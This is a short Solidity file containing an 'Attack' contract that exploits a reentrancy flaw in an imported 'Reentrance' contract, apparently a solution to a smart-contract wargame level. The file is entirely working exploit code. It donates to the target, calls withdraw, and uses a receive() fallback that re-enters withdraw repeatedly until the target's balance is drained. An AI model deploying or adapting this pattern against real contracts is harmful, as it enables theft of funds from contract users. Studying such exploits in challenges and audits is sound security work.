// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./Reentrance.sol";


contract Attack {
    Reentrance public reentrance;
    constructor (address  _address) {
        address payable target = payable(_address);
        reentrance = Reentrance(target);
    }

    function withdrawal() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(1 ether);

    }

    function bomb() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(address(reentrance).balance);
    }

    receive() external payable {

        if(address(reentrance).balance !=0){
            reentrance.withdraw(0.001 ether);
        }
    }
}
